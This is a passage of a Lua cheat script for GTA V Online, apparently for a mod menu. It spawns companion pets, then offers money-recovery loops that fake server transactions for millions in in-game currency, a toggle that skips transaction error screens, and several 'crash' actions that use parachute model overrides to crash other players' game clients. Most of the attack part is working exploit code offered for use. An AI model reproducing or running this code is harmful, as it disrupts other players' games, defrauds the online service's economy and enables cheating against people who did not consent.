        end
    end
end

        
        local rhesus_pos =  v3.new(GET_ENTITY_COORDS(rhesus_ped))
        local player_pos = v3.new(players.get_position(players.user()))
        if v3.distance(rhesus_pos, player_pos) > 100 then 
            SET_ENTITY_COORDS(rhesus_ped, player_pos.x, player_pos.y, player_pos.z)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rhesus_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end
    else
        if rhesus_ped ~= nil then 
            entities.delete(rhesus_ped)
            rhesus_ped = nil
            end
        end
    end)
--end)

local rhesustoggle = rhesus_ROOT:toggle('Rhesus', {}, '', function(on)
    rhesus = on
end, false)

rhesus_ROOT:action('Call/debug Rhesus', {}, 'This also clears all of rhesus\'s current tasks, so if he gets bugged this should fix it.', function(on)
    rhesus_call_req = true
    util.toast("Rhesus should be called successfully!")
end)

--------------------------------------------------------------------------------------------------------------------------

local rat_ROOT = menu.list(pedfeats, "Ratty")

local rat = false
local rat_blip = nil
local rat_ped = nil
local rat_mdl_hash = util.joaat("A_C_Rat")
local rat_call_req = false
local rat_vehicle = 0

util.create_tick_handler(function()
    if rat then
        if rat_ped == nil or not DOES_ENTITY_EXIST(rat_ped) or GET_ENTITY_HEALTH(rat_ped) <= 50.0 then 
            if rat_blip ~= nil then 
                util.remove_blip(rat_blip)
            end
            util.request_model(rat_mdl_hash, 2000)
            rat_ped = entities.create_ped(28, rat_mdl_hash, players.get_position(players.user()), math.random(270))
            SET_ENTITY_INVINCIBLE(rat_ped, true)
            SET_PED_CAN_BE_DRAGGED_OUT(rat_ped, false)
            SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(rat_ped, 1)
            SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(rat_ped, true)
            SET_PED_CAN_RAGDOLL(rat_ped, false)    
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rat_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            rat_blip = ADD_BLIP_FOR_ENTITY(rat_ped)
            SET_BLIP_COLOUR(rat_blip, 57)
        end
        

        if entities.get_owner(rat_ped) ~= players.user() then 
            request_control_of_entity(rat_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rat_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end

        if rat_call_req then
            CLEAR_PED_TASKS_IMMEDIATELY(rat_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rat_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            rat_call_req = false
        end

        local cur_car = entities.get_user_vehicle_as_handle(false)
        if rat_vehicle ~= cur_car then 
            if cur_car == -1 then
                CLEAR_PED_TASKS_IMMEDIATELY(rat_ped)
                TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rat_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
                rat_vehicle = -1
            else
                if IS_VEHICLE_SEAT_FREE(cur_car, 0, false) then
                    SET_PED_INTO_VEHICLE(rat_ped, cur_car, 0)
                    rat_vehicle = cur_car
                else
                    if IS_VEHICLE_SEAT_FREE(cur_car, 1, false) then
                        SET_PED_INTO_VEHICLE(rat_ped, cur_car, 1)
                        rat_vehicle = cur_car
                    else
                        if IS_VEHICLE_SEAT_FREE(cur_car, 2, false) then
                            SET_PED_INTO_VEHICLE(rat_ped, cur_car, 2)
                            rat_vehicle = cur_car
                end
            end
        end
    end
end

        
        local rat_pos =  v3.new(GET_ENTITY_COORDS(rat_ped))
        local player_pos = v3.new(players.get_position(players.user()))
        if v3.distance(rat_pos, player_pos) > 100 then 
            SET_ENTITY_COORDS(rat_ped, player_pos.x, player_pos.y, player_pos.z)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(rat_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end
    else
        if rat_ped ~= nil then 
            entities.delete(rat_ped)
            rat_ped = nil
            end
        end
    end)
--end)

local rattoggle = rat_ROOT:toggle('Ratty', {}, '', function(on)
    rat = on
end, false)

rat_ROOT:action('Call/debug Ratty', {}, 'This also clears all of rat\'s current tasks, so if he gets bugged this should fix it.', function(on)
    rat_call_req = true
    util.toast("Ratty should be called successfully!")
end)

--------------------------------------------------------------------------------------------------------------------------

local nudy_ROOT = menu.list(pedfeats, "Nudy")

local nudy = false
local nudy_blip = nil
local nudy_ped = nil
local nudy_mdl_hash = util.joaat("A_F_Y_Topless_01")
local nudy_call_req = false
local nudy_vehicle = 0

util.create_tick_handler(function()
    if nudy then
        if nudy_ped == nil or not DOES_ENTITY_EXIST(nudy_ped) or GET_ENTITY_HEALTH(nudy_ped) <= 50.0 then 
            if nudy_blip ~= nil then 
                util.remove_blip(nudy_blip)
            end
            util.request_model(nudy_mdl_hash, 2000)
            nudy_ped = entities.create_ped(28, nudy_mdl_hash, players.get_position(players.user()), math.random(270))
            SET_ENTITY_INVINCIBLE(nudy_ped, true)
            SET_PED_CAN_BE_DRAGGED_OUT(nudy_ped, false)
            SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(nudy_ped, 1)
            SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(nudy_ped, true)
            SET_PED_CAN_RAGDOLL(nudy_ped, false)    
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(nudy_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            nudy_blip = ADD_BLIP_FOR_ENTITY(nudy_ped)
            SET_BLIP_COLOUR(nudy_blip, 57)
        end
        

        if entities.get_owner(nudy_ped) ~= players.user() then 
            request_control_of_entity(nudy_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(nudy_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end

        if nudy_call_req then
            CLEAR_PED_TASKS_IMMEDIATELY(nudy_ped)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(nudy_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
            nudy_call_req = false
        end

        local cur_car = entities.get_user_vehicle_as_handle(false)
        if nudy_vehicle ~= cur_car then 
            if cur_car == -1 then
                CLEAR_PED_TASKS_IMMEDIATELY(nudy_ped)
                TASK_FOLLOW_TO_OFFSET_OF_ENTITY(nudy_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
                nudy_vehicle = -1
            else
                if IS_VEHICLE_SEAT_FREE(cur_car, 0, false) then
                    SET_PED_INTO_VEHICLE(nudy_ped, cur_car, 0)
                    nudy_vehicle = cur_car
                else
                    if IS_VEHICLE_SEAT_FREE(cur_car, 1, false) then
                        SET_PED_INTO_VEHICLE(nudy_ped, cur_car, 1)
                        nudy_vehicle = cur_car
                    else
                        if IS_VEHICLE_SEAT_FREE(cur_car, 2, false) then
                            SET_PED_INTO_VEHICLE(nudy_ped, cur_car, 2)
                            nudy_vehicle = cur_car
                end
            end
        end
    end
end

        
        local nudy_pos =  v3.new(GET_ENTITY_COORDS(nudy_ped))
        local player_pos = v3.new(players.get_position(players.user()))
        if v3.distance(nudy_pos, player_pos) > 100 then 
            SET_ENTITY_COORDS(nudy_ped, player_pos.x, player_pos.y, player_pos.z)
            TASK_FOLLOW_TO_OFFSET_OF_ENTITY(nudy_ped, players.user_ped(), 0, -1, 0, 7.0, -1, 1, true)
        end
    else
        if nudy_ped ~= nil then 
            entities.delete(nudy_ped)
            nudy_ped = nil
            end
        end
    end)
--end)

local nudytoggle = nudy_ROOT:toggle('Nudy', {}, 'nudy ', function(on)
    nudy = on
end, false)

nudy_ROOT:action('Call/debug Nudy', {}, 'This also clears all of nudy\'s current tasks, so if she gets bugged this should fix it.', function(on)
    nudy_call_req = true
    util.toast("Nudy should be called successfully!")
end)

--------------------------------------------------------------------------------------------------------------------------

play_ref:action("Tp zu Blondie", {"blondie"}, "bring dich zu blondie", function()
    menu.trigger_commands("tplllIIIlIIlIlIII")
    menu.trigger_commands("tpvehlllIIIlIIlIlIII")
end)

--------------------------------------------------------------------------------------------------------------------------

local loops = recovs:list("Loops")

local guns = recovs:list("Money Guns")

local limited = recovs:list("Limited")

local misc = recovs:list("Misc")

------------------------------------------------

loops:toggle("1mil Loop", {}, "", function(on_tick)
    on = on_tick
    while on do
        trigger_transaction(hash.loop1kk, 1000000)
        util.yield(1000)
    end
end)

loops:toggle("180K Loop", {}, "", function(on_tick)
    toggled = on_tick
    while toggled do
        trigger_transaction(hash.loop180k, 180000)
        util.yield(1000)
    end
end)

loops:toggle("50K Loop", {}, "", function(on_tick)
    toggled = on_tick
    while toggled do
        trigger_transaction(hash.loop50k, 50000)
        util.yield(1000)
    end
end)

guns:action("                                     !! READ !!", {}, "If the props wont spawn anymore, switch session.", function()
    util.toast("If the props wont spawn anymore, switch session.")
end)

local obj = {expl = false}	
guns:toggle_loop("Money Bag", {""}, "", function(toggled)
    local hash = util.joaat("prop_money_bag_01")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("prop_money_bag_01")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

guns:toggle_loop("Money Case", {""}, "", function(toggled)
    local hash = util.joaat("prop_cash_case_02")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("prop_cash_case_02")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

guns:toggle_loop("Cash Pile", {""}, "", function(toggled)
    local hash = util.joaat("prop_cash_pile_01")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("prop_cash_pile_01")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

guns:toggle_loop("Cash Crate", {""}, "", function(toggled)
    local hash = util.joaat("prop_cash_crate_01")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("prop_cash_crate_01")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

guns:toggle_loop("Tank Trailer", {""}, "", function(toggled)
    local hash = util.joaat("prop_rail_tankcar2")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("prop_rail_tankcar2")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

guns:toggle_loop("Distant Truck", {""}, "", function(toggled)
    local hash = util.joaat("prop_distantcar_truck")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("prop_distantcar_truck")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

guns:toggle_loop("Ferris Wheel", {""}, "", function(toggled)
    local hash = util.joaat("p_ferris_wheel_amo_p")
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 1, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) then  
        local camcoords = get_offset_from_camera(10)
        local cash = MISC.GET_HASH_KEY("p_ferris_wheel_amo_p")
        STREAMING.REQUEST_MODEL(cash)
        if STREAMING.HAS_MODEL_LOADED(cash) == false then  
            STREAMING.REQUEST_MODEL(cash)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(1704231442, camcoords.x, camcoords.y, camcoords.z, 0, 2000, cash, false, true)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)

limited:action("40M Limited Transaction (Slow) (Doesnt really work)", {}, "", function()
    trigger_transaction(hash.bend_job, 15000000)
    trigger_transaction(hash.gangops_award_mastermind_3, 7000000)
    trigger_transaction(hash.job_bonus, 15000000)
    trigger_transaction(hash.daily_objective_event, 1000000)
    trigger_transaction(hash.business_hub_sell, 2000000)
end)

limited:action("Bend Job | 15mil", {}, "", function()
    trigger_transaction(hash.bend_job, 15000000)
end)

limited:action("Gangops Award Mastermind | 7mil", {}, "", function()
    trigger_transaction(hash.gangops_award_mastermind_3, 7000000)
end)

limited:action("Job Bonus | 15mil", {}, "", function()
    trigger_transaction(hash.job_bonus, 15000000)
end)

limited:action("Daily Objective | 10mil", {}, "", function()
    trigger_transaction(hash.daily_objective_event, 1000000)
end)

limited:action("Business Hub sell | 2mil", {}, "", function()
    trigger_transaction(hash.business_hub_sell, 2000000)
end)

misc:toggle_loop("Skip Transaction Error", {""}, "clientside", function()
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    local hashes = {1990323196, 1748022689, -396931869, -896436592, 583244483, -991495373}
    for hashes as hash do
        if message_hash == hash then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
            wait(50)
        end
    end
end)

-------------------------------------------------------------

menu.action(custselc, "Ruiner Crash V1", {}, "", function()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 15 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

end)

menu.action(custselc, "Ruiner Crash V2", {}, "", function()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 30 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2200, false, true, true)
        util.yield(130)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 3235319999)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(130)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

end)

menu.action(custselc, "Umbrella Crash V1", {}, "", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0, 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
        false, true, true)
end)

menu.action(custselc, "Umbrella Crash V2", {}, "", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)
menu.action(custselc, "Umbrella Crash V3", {}, "", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 192829538
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 192829538
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(custselc, "Umbrella Crash V4", {}, "", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1338692320
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1338692320
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(custselc, "Umbrella Crash V5", {}, "", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(custselc, "Nature Global Crash", {}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    util.yield(100)
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
